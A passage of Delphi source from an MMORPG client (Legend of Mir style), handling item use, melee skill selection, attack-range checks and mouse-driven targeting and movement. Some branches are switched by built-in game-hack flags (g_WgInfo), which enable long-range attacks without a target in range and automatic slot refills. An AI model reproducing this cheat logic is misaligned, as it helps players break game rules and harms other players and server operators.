        SendHeroEat(g_HeroItemArr[idx].MakeIndex, g_HeroItemArr[idx].S.Name);
        ItemUseSound(g_HeroItemArr[idx].S.StdMode);
      End;
    End
    Else
    Begin
      If (idx = -1) And g_boItemMoving Then
      Begin
        g_boItemMoving := FALSE;
        g_HeroEatingItem := g_MovingItem.Item;
        g_MovingItem.Item.S.Name := '';

        If (g_HeroEatingItem.S.StdMode = 4) And (g_HeroEatingItem.S.Shape < 100)
          Then
        Begin

          If g_HeroEatingItem.S.Shape < 50 Then
          Begin
            If mrYes <> FrmDlg.DMessageDlg('[' + g_HeroEatingItem.S.Name +
              '] 你想让英雄开始训练吗？', [mbYes, mbNo]) Then
            Begin
              AddItemHeroBag(g_HeroEatingItem);
              exit;
            End;
          End
          Else
          Begin

            If mrYes <> FrmDlg.DMessageDlg('[' + g_HeroEatingItem.S.Name +
              '] 你想让英雄开始训练吗？', [mbYes, mbNo]) Then
            Begin
              AddItemHeroBag(g_HeroEatingItem);
              exit;
            End;
          End;
        End;
        g_dwHeroEatTime := GetTickCount;
        SendHeroEat(g_HeroEatingItem.MakeIndex, g_HeroEatingItem.S.Name);
        ItemUseSound(g_HeroEatingItem.S.StdMode);
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.HeroEatItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.OpenEatItem(idx: integer; sIteName: String);
Var
  I: integer;
  //  boDown:Boolean;
  ItIdx: Integer;
  //  Str:String;
  //  OpenIdx:integer;
Begin
  Try //程序自动增加
    If g_WgInfo.boAutoDownDrup Then
    Begin
      ItIdx := -1;
      If (idx In [0..5]) And (sIteName <> '') Then
      Begin
        For I := MAXBAGITEMCL - 1 Downto 0 Do
        Begin
          If I < 6 Then
            break;
          If CompareText(g_ItemArr[I].S.Name, sIteName) = 0 Then
          Begin
            ItIdx := I;
            break;
          End;
        End;
        If ItIdx > -1 Then
        Begin
          g_ItemArr[idx] := g_ItemArr[ItIdx];
          g_ItemArr[ItIdx].S.Name := '';
        End;
      End;
    End;
    {if g_WgInfo.boAutoDownDrup then begin
      boDown:=False;
      Str:=GetOpenItem(sIteName);
      ItIdx:=-1;
      //if idx in [0..5] then begin
      for I:=0 to MAXBAGITEMCL-1 do begin
        if CompareText(g_ItemArr[I].S.Name,sIteName) = 0 then begin
          ItIdx:=I;
        end;
        if (Str<>'') and (CompareText(g_ItemArr[I].S.Name,Str) = 0) then begin
          OpenIdx:=I;
        end;
      end;
      if (idx in [0..5]) and (ItIdx>=0) then begin
        g_ItemArr[idx]:=g_ItemArr[ItIdx];
        g_ItemArr[ItIdx].S.Name:='';
      end;
      if (Itidx=-1) and (Str<>'') then
        SendEat (g_ItemArr[OpenIdx].MakeIndex, g_ItemArr[OpenIdx].S.Name );
    end;}
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.OpenEatItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.EatItem(idx: integer);
Begin
  Try //程序自动增加
    If idx In [0..MAXBAGITEMCL - 1] Then
    Begin
      If (g_EatingItem.S.Name <> '') And (GetTickCount - g_dwEatTime > 5 * 1000)
        Then
      Begin
        g_EatingItem.S.Name := '';
      End;
      //if (g_EatingItem.S.Name = '') and (g_ItemArr[idx].S.Name <> '') and (g_ItemArr[idx].S.StdMode <= 3) then begin
      If (g_EatingItem.S.Name = '') And (g_ItemArr[idx].S.Name <> '') Then
      Begin
        g_EatingItem := g_ItemArr[idx];
        if (g_ItemArr[idx].Dura>1) and (g_ItemArr[idx].S.StdMode=0) then
          Dec(g_ItemArr[idx].Dura)
        else
          g_ItemArr[idx].S.Name := '';

        If (g_ItemArr[idx].S.StdMode = 4) And (g_ItemArr[idx].S.Shape < 100)
          Then
        Begin

          If g_ItemArr[idx].S.Shape < 50 Then
          Begin
            If mrYes <> FrmDlg.DMessageDlg('[' + g_ItemArr[idx].S.Name +
              '] 你想要开始训练吗？', [mbYes, mbNo]) Then
            Begin
              g_ItemArr[idx] := g_EatingItem;
              exit;
            End;
          End
          Else
          Begin

            If mrYes <> FrmDlg.DMessageDlg('[' + g_ItemArr[idx].S.Name +
              '] 你想要开始训练吗？', [mbYes, mbNo]) Then
            Begin
              g_ItemArr[idx] := g_EatingItem;
              exit;
            End;
          End;
        End;
        g_dwEatTime := GetTickCount;
        //OpenEatItem(idx,g_EatingItem.S.Name);
        SendEat(g_ItemArr[idx].MakeIndex, g_ItemArr[idx].S.Name);
        ItemUseSound(g_ItemArr[idx].S.StdMode);
      End;
    End
    Else
    Begin
      If (idx = -1) And g_boItemMoving Then
      Begin
        g_boItemMoving := FALSE;
        g_EatingItem := g_MovingItem.Item;
        g_MovingItem.Item.S.Name := '';

        If (g_EatingItem.S.StdMode = 4) And (g_EatingItem.S.Shape < 100) Then
        Begin

          If g_EatingItem.S.Shape < 50 Then
          Begin
            If mrYes <> FrmDlg.DMessageDlg('[' + g_EatingItem.S.Name +
              '] 你想要开始训练吗？', [mbYes, mbNo]) Then
            Begin
              AddItemBag(g_EatingItem);
              exit;
            End;
          End
          Else
          Begin

            If mrYes <> FrmDlg.DMessageDlg('[' + g_EatingItem.S.Name +
              '] 你想要开始训练吗？', [mbYes, mbNo]) Then
            Begin
              AddItemBag(g_EatingItem);
              exit;
            End;
          End;
        End;
        g_dwEatTime := GetTickCount;
        SendEat(g_EatingItem.MakeIndex, g_EatingItem.S.Name);
        ItemUseSound(g_EatingItem.S.StdMode);
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.EatItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.EatOpenItem(idx: integer);
Begin
  Try //程序自动增加
    If idx In [0..MAXBAGITEMCL - 1] Then
    Begin
      g_ItemArr[idx].S.Name := '';
      SendEat(g_ItemArr[idx].MakeIndex, g_ItemArr[idx].S.Name);
      ItemUseSound(g_EatingItem.S.StdMode);
    End;

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.EatOpenItem'); //程序自动增加
  End; //程序自动增加
End;

Function TfrmMain.TargetInSwordLongAttackRange(ndir: integer; nRate: Integer =
  2): Boolean;
Var
  nx, ny: integer;
  actor: TActor;
  I: Integer;
Begin
  Result := FALSE;
  GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, ndir, nx, ny);
  For i := 2 To nRate Do
    GetFrontPosition(nx, ny, ndir, nx, ny);

  If (abs(g_MySelf.m_nCurrX - nX) <= nRate) Or (abs(g_MySelf.m_nCurrY - ny) <=
    nRate) Then
  Begin
    actor := PlayScene.FindActorXY(nx, ny);
    If actor <> Nil Then
      If Not actor.m_boDeath Then
        Result := TRUE;
  End;
End;

Function TfrmMain.TargetInSwordWideAttackRange(ndir: integer): Boolean;
Var
  nx, ny, rx, ry, mdir: integer;
  actor, ractor: TActor;
Begin
  Result := FALSE;
  GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, ndir, nx, ny);
  actor := PlayScene.FindActorXY(nx, ny);

  mdir := (ndir + 1) Mod 8;
  GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, mdir, rx, ry);
  ractor := PlayScene.FindActorXY(rx, ry);
  If ractor = Nil Then
  Begin
    mdir := (ndir + 2) Mod 8;
    GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, mdir, rx, ry);
    ractor := PlayScene.FindActorXY(rx, ry);
  End;
  If ractor = Nil Then
  Begin
    mdir := (ndir + 7) Mod 8;
    GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, mdir, rx, ry);
    ractor := PlayScene.FindActorXY(rx, ry);
  End;

  If (actor <> Nil) And (ractor <> Nil) Then
    If Not actor.m_boDeath And Not ractor.m_boDeath Then
      Result := TRUE;
End;

Function TfrmMain.TargetInSwordCrsAttackRange(ndir: integer): Boolean;
Var
  nx, ny, rx, ry, mdir: integer;
  actor, ractor: TActor;
Begin
  Result := FALSE;
  GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, ndir, nx, ny);
  actor := PlayScene.FindActorXY(nx, ny);

  mdir := (ndir + 1) Mod 8;
  GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, mdir, rx, ry);
  ractor := PlayScene.FindActorXY(rx, ry);
  If ractor = Nil Then
  Begin
    mdir := (ndir + 2) Mod 8;
    GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, mdir, rx, ry);
    ractor := PlayScene.FindActorXY(rx, ry);
  End;
  If ractor = Nil Then
  Begin
    mdir := (ndir + 7) Mod 8;
    GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, mdir, rx, ry);
    ractor := PlayScene.FindActorXY(rx, ry);
  End;

  If (actor <> Nil) And (ractor <> Nil) Then
    If Not actor.m_boDeath And Not ractor.m_boDeath Then
      Result := TRUE;
End;

{--------------------- Mouse Interface ----------------------}

Procedure TfrmMain.DXDrawMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
Var
  { i,}mx, my, {msx, msy,} sel: integer;
  target: TActor;
  itemnames: String;
Begin
  Try //程序自动增加
    If g_DWinMan.MouseMove(Shift, X, Y) Then
      exit;
    If (g_MySelf = Nil) Or (DScreen.CurrentScene <> PlayScene) Then
      exit;
    g_boSelectMyself := PlayScene.IsSelectMyself(X, Y);

    target := PlayScene.GetAttackFocusCharacter(X, Y, g_nDupSelection, sel,
      FALSE);
    If g_nDupSelection <> sel Then
      g_nDupSelection := 0;
    If target <> Nil Then
    Begin
      If (target.m_sUserName = '') And (GetTickCount -
        target.m_dwSendQueryUserNameTime > 10 * 1000) Then
      Begin
        target.m_dwSendQueryUserNameTime := GetTickCount;
        SendQueryUserName(target.m_nRecogId, target.m_nCurrX, target.m_nCurrY);
      End;
      g_FocusCret := target;
    End
    Else
      g_FocusCret := Nil;

    g_FocusItem := PlayScene.GetDropItems(X, Y, itemnames);
    If g_FocusItem <> Nil Then
    Begin
      PlayScene.ScreenXYfromMCXY(g_FocusItem.X, g_FocusItem.Y, mx, my);
      DScreen.ShowHint(mx - 20,
        my - 10,
        itemnames, //PTDropItem(ilist[i]).Name,
        clWhite,
        TRUE);
    End
    Else
      DScreen.ClearHint;

    PlayScene.CXYfromMouseXY(X, Y, g_nMouseCurrX, g_nMouseCurrY);
    g_nMouseX := X;
    g_nMouseY := Y;
    g_MouseItem.S.Name := '';
    g_MouseStateItem.S.Name := '';
    g_MouseUserStateItem.S.Name := '';
    If ((ssLeft In Shift) Or (ssRight In Shift)) And (GetTickCount -
      mousedowntime > 300) Then
      _DXDrawMouseDown(self, mbLeft, Shift, X, Y);

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DXDrawMouseMove'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.DXDrawMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
Begin
  Try //程序自动增加
    g_boAutoMoveing := False;
    mousedowntime := GetTickCount;
    g_nRunReadyCount := 0;
    _DXDrawMouseDown(Sender, Button, Shift, X, Y);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DXDrawMouseDown'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.AttackTarget(target: TActor);
Var
  tdir, dx, dy, nHitMsg: integer;
Begin
  Try //程序自动增加
    nHitMsg := CM_HIT;
    If g_UseItems[U_WEAPON].S.StdMode = 6 Then
      nHitMsg := CM_HEAVYHIT;

    tdir := GetNextDirection(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
      target.m_nCurrX, target.m_nCurrY);
    If (abs(g_MySelf.m_nCurrX - target.m_nCurrX) <= 1) And (abs(g_MySelf.m_nCurrY
      - target.m_nCurrY) <= 1) And (Not target.m_boDeath) Then
    Begin
      If CanNextAction And ServerAcceptNextAction And CanNextHit Then
      Begin

        If g_boNextTimeLongFireHit And (g_MySelf.m_Abil.MP >= 7) Then
        Begin
          g_boNextTimeLongFireHit := FALSE;
          nHitMsg := CM_LONGFIRESWORD;
        End
        Else If g_boCanLswHit And (g_MySelf.m_Abil.MP >= 7) Then
        Begin
          g_boCanLswHit := False;
          g_boCanLawHit := False;
          nHitMsg := CM_LONGSWORD1;
        End
        Else If g_boCanLawHit And (g_MySelf.m_Abil.MP >= 7) Then
        Begin
          g_boCanLswHit := False;
          g_boCanLawHit := False;
          nHitMsg := CM_LONGSWORD2;
        End
        Else If g_boNextTimeFireHit And (g_MySelf.m_Abil.MP >= 7) Then
        Begin
          g_boNextTimeFireHit := FALSE;
          nHitMsg := CM_FIREHIT;
        End
        Else If g_boNextTimePowerHit Then
        Begin //颇况 酒咆牢 版快, 抗档八过
          g_boNextTimePowerHit := FALSE;
          nHitMsg := CM_POWERHIT;
        End
        Else If (g_nDragonCount >= g_nDragonMax) And (g_MySelf.m_Abil.MP >= 10)
          Then
        Begin
          nHitMsg := CM_TWINHIT;
        End
        Else If g_boCanWideHit And (g_MySelf.m_Abil.MP >= 3) Then
        Begin //and (TargetInSwordWideAttackRange (tdir)) then begin  //氛 酒咆牢 版快, 馆岿八过
          nHitMsg := CM_WIDEHIT;
        End
        Else If g_boCanCrsHit And (g_MySelf.m_Abil.MP >= 6) Then
        Begin
          nHitMsg := CM_CRSHIT;
        End
        Else If g_boCanLongHit
          And (TargetInSwordLongAttackRange(tdir) Or g_WgInfo.boCanLongHit) Then
        Begin //氛 酒咆牢 版快, 绢八贱
          nHitMsg := CM_LONGHIT;
        End;

        //if ((target.m_btRace <> RCC_USERHUMAN) and (target.m_btRace <> RCC_GUARD)) or (ssShift in Shift) then //荤恩阑 角荐肺 傍拜窍绰 巴阑 阜澜
        g_MySelf.SendMsg(nHitMsg, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, tdir, 0,
          0, '', 0);
        g_dwLatestHitTick := GetTickCount;
      End;
      g_dwLastAttackTick := GetTickCount;
    End
    Else If g_boNextTimeLongFireHit And (g_MySelf.m_Abil.MP >= 7) And (Not
      target.m_boDeath) And (TargetInSwordLongAttackRange(tdir, 4) Or
      TargetInSwordLongAttackRange(tdir, 3)) Then
    Begin
      g_boNextTimeLongFireHit := FALSE;
      nHitMsg := CM_LONGFIRESWORD;
      g_MySelf.SendMsg(nHitMsg, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, tdir, 0,
        0,
        '', 0);
      g_dwLatestHitTick := GetTickCount;
      g_dwLastAttackTick := GetTickCount;
    End
    Else If g_boCanLswHit And (g_MySelf.m_Abil.MP >= 7) And (Not
      target.m_boDeath) And (TargetInSwordLongAttackRange(tdir, 4) Or
      TargetInSwordLongAttackRange(tdir, 3)) Then
    Begin //氛 酒咆牢 版快, 绢八贱
      g_boCanLswHit := False;
      g_boCanLawHit := False;
      nHitMsg := CM_LONGSWORD1;
      g_MySelf.SendMsg(nHitMsg, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, tdir, 0,
        0,
        '', 0);
      g_dwLatestHitTick := GetTickCount;
      g_dwLastAttackTick := GetTickCount;
    End
    Else If g_boCanLawHit And (g_MySelf.m_Abil.MP >= 7) And (Not
      target.m_boDeath) And (TargetInSwordLongAttackRange(tdir)) Then
    Begin //氛 酒咆牢 版快, 绢八贱
      g_boCanLswHit := False;
      g_boCanLawHit := False;
      nHitMsg := CM_LONGSWORD2;
      g_MySelf.SendMsg(nHitMsg, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, tdir, 0,
        0,
        '', 0);
      g_dwLatestHitTick := GetTickCount;
      g_dwLastAttackTick := GetTickCount;
    End
    Else If g_WgInfo.boCanLongHit2 And (Not target.m_boDeath) And g_boCanLongHit
      And (TargetInSwordLongAttackRange(tdir)) Then
    Begin //氛 酒咆牢 版快, 绢八贱
      If CanNextAction And ServerAcceptNextAction And CanNextHit Then
      Begin
        nHitMsg := CM_LONGHIT;
        g_MySelf.SendMsg(nHitMsg, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, tdir, 0,
          0, '', 0);
        g_dwLatestHitTick := GetTickCount;
      End;
      g_dwLastAttackTick := GetTickCount;
    End
    Else
    Begin
      //厚档甫 甸绊 乐栏搁
      //if (UseItems[U_WEAPON].S.Shape = 6) and (target <> nil) then begin
      //   Myself.SendMsg (CM_THROW, Myself.XX, Myself.m_nCurrY, tdir, integer(target), 0, '', 0);
      //   TargetCret := nil;  //
      //end else begin
      If (abs(g_MySelf.m_nCurrX - target.m_nCurrX) <= 2) And
        (abs(g_MySelf.m_nCurrY - target.m_nCurrY) <= 2) And (Not
        target.m_boDeath) Then
        g_ChrAction := caWalk
      Else
        g_ChrAction := caRun; //跑步砍
      GetBackPosition(target.m_nCurrX, target.m_nCurrY, tdir, dx, dy);
      g_nTargetX := dx;
      g_nTargetY := dy;
      //end;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.AttackTarget'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain._DXDrawMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
Var
  tdir, nx, ny, nHitMsg, sel: integer;
  target: TActor;
Begin
  Try //程序自动增加
    ActionKey := 0;
    g_nMouseX := X;
    g_nMouseY := Y;
    g_boAutoDig := FALSE;

    If (Button = mbRight) And g_boItemMoving Then
    Begin //是否当前在移动物品
      //FrmDlg.DMessageDlg('dsfasdf',[mbok]);
      FrmDlg.CancelItemMoving;
      exit;
    End;
    If g_DWinMan.MouseDown(Button, Shift, X, Y) Then
      exit; //鼠标移到窗口上了则跳过
    If (g_MySelf = Nil) Or (DScreen.CurrentScene <> PlayScene) Then
      exit; //如果人物退出则跳过

    If ssRight In Shift Then
    Begin //鼠标右键
      If Shift = [ssRight] Then
        Inc(g_nDupSelection); //般闷阑 版快 急琶
      target := PlayScene.GetAttackFocusCharacter(X, Y, g_nDupSelection, sel,
        FALSE); //取指定坐标上的角色
      If g_nDupSelection <> sel Then
        g_nDupSelection := 0;
      If target <> Nil Then
      Begin
        If ssCtrl In Shift Then
        Begin //CTRL + 鼠标右键 = 显示角色的信息
          If GetTickCount - g_dwLastMoveTick > 1000 Then
          Begin
            If (target.m_btRace = 0) //And (Not target.m_boDeath)
             Then
            Begin
              //取得人物信息
              SendClientMessage(CM_QUERYUSERSTATE, target.m_nRecogId,
                target.m_nCurrX, target.m_nCurrY, 0);
              exit;
            End;
          End;
        End
        Else If (ssAlt In Shift) Then
        Begin
          If (target.m_sGroupMsg <> '') And (g_GroupMembers.Count = 0) Then
          Begin //人物开启组队信息
            If
              FrmDlg.DMessageDlg(Format('是否确定加入[%s]的队伍中吗？',
              [target.m_sUserName]), [mbYes, mbNo]) = mrYes Then
            Begin
              //FrmMain.SendShopBuy(ShowItem.sName);
              SendAutoAddGroup(target.m_sUserName);
            End;
          End
          Else If (target.m_btRace = 0) Then
          Begin
            PlayScene.SetEditChar(target.m_sUserName);
          End;
          exit;
        End;
      End
      Else
        g_nDupSelection := 0;
      //按鼠标右键，并且鼠标指向空位置
      If Not g_MySelf.m_boIsShop {开店不允许操作} Then
      Begin
        PlayScene.CXYfromMouseXY(X, Y, g_nMouseCurrX, g_nMouseCurrY);

        If (abs(g_MySelf.m_nCurrX - g_nMouseCurrX) <= 1) And
          (abs(g_MySelf.m_nCurrY - g_nMouseCurrY) <= 1) Then
        Begin //目标座标
          tdir := GetNextDirection(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
            g_nMouseCurrX, g_nMouseCurrY);
          If CanNextAction And ServerAcceptNextAction Then
          Begin
            g_MySelf.SendMsg(CM_TURN, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
              tdir, 0, 0, '', 0);
          End;
        End
        Else
        Begin //顿扁
          g_ChrAction := caRun;
          g_nTargetX := g_nMouseCurrX;
          g_nTargetY := g_nMouseCurrY;
          exit;
        End;
      End;

      {
            if CanNextAction and ServerAcceptNextAction then begin
              //人物座标与目标座标之间是否小于2，小于则走操作
              if (abs(Myself.XX-MCX) <= 2) and (abs(Myself.m_nCurrY-MCY) <= 2) then begin
                 ChrAction := caWalk;
              end else begin //跑操作
                 ChrAction := caRun;
              end;
                 TargetX := MCX;
                 TargetY := MCY;
                 exit;
            end;
       }
    End;

    If ssLeft In Shift {Button = mbLeft} Then
    Begin
      target := PlayScene.GetAttackFocusCharacter(X, Y, g_nDupSelection, sel,
        TRUE);
      PlayScene.CXYfromMouseXY(X, Y, g_nMouseCurrX, g_nMouseCurrY);
      g_TargetCret := Nil;

      If (g_UseItems[U_WEAPON].S.Name <> '') And (target = Nil)
        //骑马状态不可以操作
      And (g_MySelf.m_btHorse = 0) And (Not g_MySelf.m_boIsShop
        {开店不允许操作}) Then
      Begin
        //挖矿
        If g_UseItems[U_WEAPON].S.Shape = 19 Then
        Begin //鹤嘴锄
          tdir := GetNextDirection(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
            g_nMouseCurrX, g_nMouseCurrY);
          GetFrontPosition(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, tdir, nx, ny);
          If Not Map.CanMove(nx, ny) Or (ssShift In Shift) Then
          Begin //不能移动或强行挖矿
            If CanNextAction And ServerAcceptNextAction And CanNextHit Then
            Begin
              g_MySelf.SendMsg(CM_HIT + 1, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
                tdir, 0, 0, '', 0);
            End;
            g_boAutoDig := TRUE;
            exit;

          End;
        End;
      End;

      If (ssAlt In Shift)
        //骑马状态不可以操作
      And (g_MySelf.m_btHorse = 0) And (Not g_MySelf.m_boIsShop
        {开店不允许操作}) Then
      Begin
        //挖物品
        tdir := GetNextDirection(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
          g_nMouseCurrX, g_nMouseCurrY);
        If CanNextAction And ServerAcceptNextAction Then
        Begin
          target := PlayScene.ButchAnimal(g_nMouseCurrX, g_nMouseCurrY);
          If target <> Nil Then
          Begin
            SendButchAnimal(g_nMouseCurrX, g_nMouseCurrY, tdir,
              target.m_nRecogId);
            g_MySelf.SendMsg(CM_SITDOWN, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
              tdir, 0, 0, '', 0); //磊技绰 鞍澜
            exit;
          End;
          g_MySelf.SendMsg(CM_SITDOWN, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
            tdir, 0, 0, '', 0);
        End;
        g_nTargetX := -1;
      End
      Else
      Begin
        If (target <> Nil) Or (ssShift In Shift) Then
        Begin
          //哭率付快胶 努腐 肚绰 鸥百捞 乐澜.
          g_nTargetX := -1;
          If target <> Nil Then
          Begin
            //鸥百捞 乐澜.

            //叭促啊 惑牢 皋春啊 唱坷绰 巴阑 规瘤.
            If GetTickCount - g_dwLastMoveTick > 300 Then
            Begin
              //点击NPC
              If target.m_btRace = RCC_MERCHANT Then
              Begin
                g_dwLastMoveTick := GetTickCount;
                SendClientMessage(CM_CLICKNPC, target.m_nRecogId, 0, 0, 0);
                exit;
              End;
              //点击个人商店
              If (target.m_btRace = RC_PLAYOBJECT) And (target.m_boIsShop) Then
              Begin
                g_dwLastMoveTick := GetTickCount;
                SendClientMessage(CM_CLICKSHOP, target.m_nRecogId,
                  target.m_nCurrX, target.m_nCurrY, 0);
                exit;
              End;
            End;

            If (Not target.m_boDeath)
              //骑马不允许操作
            And (g_MySelf.m_btHorse = 0) And (Not g_MySelf.m_boIsShop
              {开店不允许操作}) Then
            Begin
              g_TargetCret := target;
              If ((target.m_btRace <> RCC_USERHUMAN) And
                (target.m_btRace <> RCC_GUARD) And
                (target.m_btRace <> RCC_MERCHANT) And
                (pos('(', target.m_sUserName) = 0)
                //包括'('的角色名称为召唤的宝宝
                )
                Or (ssShift In Shift) //SHIFT + 鼠标左键
              Or (target.m_nNameColor = ENEMYCOLOR)
                {//利篮 磊悼 傍拜捞 凳}Then
              Begin
                AttackTarget(target);
                g_dwLatestHitTick := GetTickCount;
              End;
            End;
          End
          Else
          Begin
            //骑马不允许操作
            If (g_MySelf.m_btHorse = 0) And (Not g_MySelf.m_boIsShop
              {开店不允许操作}) Then
            Begin
              tdir := GetNextDirection(g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
                g_nMouseCurrX, g_nMouseCurrY);
              If CanNextAction And ServerAcceptNextAction And CanNextHit Then
              Begin
                nHitMsg := CM_HIT + Random(3);
                //外挂打开后隔空刺杀
                If g_boCanLongHit And (TargetInSwordLongAttackRange(tdir) Or
                  g_WgInfo.boCanLongHit) Then
                Begin //是否可以使用刺杀
                  nHitMsg := CM_LONGHIT;
                End;
                If g_boCanWideHit And (g_MySelf.m_Abil.MP >= 3) And
                  (TargetInSwordWideAttackRange(tdir)) Then
                Begin //是否可以使用半月
                  nHitMsg := CM_WIDEHIT;
                End;
                If g_boCanCrsHit And (g_MySelf.m_Abil.MP >= 6) And
                  (TargetInSwordCrsAttackRange(tdir)) Then
                Begin //是否可以使用半月
                  nHitMsg := CM_CRSHIT;
                End;
                g_MySelf.SendMsg(nHitMsg, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
                  tdir, 0, 0, '', 0);
              End;
              g_dwLastAttackTick := GetTickCount;
            End;
          End;
        End
        Else
        Begin
          //            if (MCX = Myself.XX) and (MCY = Myself.m_nCurrY) then begin
          If Not g_MySelf.m_boIsShop {开店不允许操作} Then
          Begin
            If (g_nMouseCurrX = (g_MySelf.m_nCurrX)) And (g_nMouseCurrY =
              (g_MySelf.m_nCurrY)) Then
            Begin
              //               tdir := GetNextDirection (g_MySelf.m_nCurrX, g_MySelf.m_nCurrY, g_nMouseCurrX, g_nMouseCurrY);
              If CanNextAction And ServerAcceptNextAction Then
              Begin
                SendPickup; //捡物品
              End;
            End
            Else If GetTickCount - g_dwLastAttackTick > 1000 Then
            Begin //最后攻击操作停留指定时间才能移动
              If ssCtrl In Shift Then
              Begin
                g_ChrAction := caRun;
              End
              Else
              Begin
                g_ChrAction := caWalk;
              End;
              g_nTargetX := g_nMouseCurrX;
              g_nTargetY := g_nMouseCurrY;
            End;
          End;
        End;
      End;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain._DXDrawMouseDown'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.DXDrawDblClick(Sender: TObject);
Var
  pt: TPoint;
Begin
  Try //程序自动增加
    GetCursorPos(pt);
    If g_boUseDIBSurface Then
    Begin
      pt.X := pt.X - m_Point.X;
      pt.Y := pt.Y - m_Point.Y;
    End;
    If g_DWinMan.DblClick(pt.X, pt.Y) Then
      exit;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DXDrawDblClick'); //程序自动增加
  End; //程序自动增加
End;

Function TfrmMain.CheckDoorAction(dx, dy: integer): Boolean;
Var
  //   nx, ny, ndir,
  door: integer;
Begin
  Result := FALSE;
  //if not Map.CanMove (dx, dy) then begin
     //if (Abs(dx-Myself.XX) <= 2) and (Abs(dy-Myself.m_nCurrY) <= 2) then begin
  door := Map.GetDoor(dx, dy);
  If door > 0 Then
  Begin
    If Not Map.IsDoorOpen(dx, dy) Then
    Begin
      SendClientMessage(CM_OPENDOOR, door, dx, dy, 0);
      Result := TRUE;
    End;
  End;
  //end;
//end;
End;

Procedure TfrmMain.DXDrawMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
Begin
  Try //程序自动增加
    If g_DWinMan.MouseUp(Button, Shift, X, Y) Then
      exit;
    g_nTargetX := -1;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DXDrawMouseUp'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.DXDrawClick(Sender: TObject);
Var
  pt: TPoint;
Begin
  Try //程序自动增加
    GetCursorPos(pt);
    If g_DWinMan.Click(pt.X, pt.Y) Then
      exit;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DXDrawClick'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.MouseTimerTimer(Sender: TObject);
Var
  //  I: Integer;
  pt: TPoint;
  keyvalue: TKeyBoardState;
  shift: TShiftState;
  //   str:String;

Begin
  Try //程序自动增加
    GetCursorPos(pt);
    SetCursorPos(pt.X, pt.Y);

    If g_TargetCret <> Nil Then
    Begin
      If ActionKey > 0 Then
      Begin
        ProcessKeyMessages;
      End
      Else
      Begin
        If Not g_TargetCret.m_boDeath And PlayScene.IsValidActor(g_TargetCret)
          Then
        Begin
          FillChar(keyvalue, sizeof(TKeyboardState), #0);
          If GetKeyboardState(keyvalue) Then
          Begin
            shift := [];
            If ((keyvalue[VK_SHIFT] And $80) <> 0) Then
              shift := shift + [ssShift];
            If ((g_TargetCret.m_btRace <> RCC_USERHUMAN) And
              (g_TargetCret.m_btRace <> RCC_GUARD) And
              (g_TargetCret.m_btRace <> RCC_MERCHANT) And
              (pos('(', g_TargetCret.m_sUserName) = 0)
              //林牢乐绰 各(碍力傍拜 秦具窃)
              )
              Or (g_TargetCret.m_nNameColor = ENEMYCOLOR)
              //利篮 磊悼 傍拜捞 凳
            Or (((ssShift In Shift) Or g_boShift) And (Not
              PlayScene.EdChat.Visible)) Then
            Begin //荤恩阑 角荐肺 傍拜窍绰 巴阑 阜澜
              AttackTarget(g_TargetCret);
            End; //else begin
            //TargetCret := nil;
         //end
          End;
        End
        Else
          g_TargetCret := Nil;
      End;
    End;
    If g_boAutoDig Then
    Begin
      If CanNextAction And ServerAcceptNextAction And CanNextHit Then
      Begin
        g_MySelf.SendMsg(CM_HIT + 1, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
          g_MySelf.m_btDir, 0, 0, '', 0);
      End;
    End;
    //DScreen.AddChatBoardString (Format(sTest1,['dsfa']), GetRGB(255), GetRGB(252));
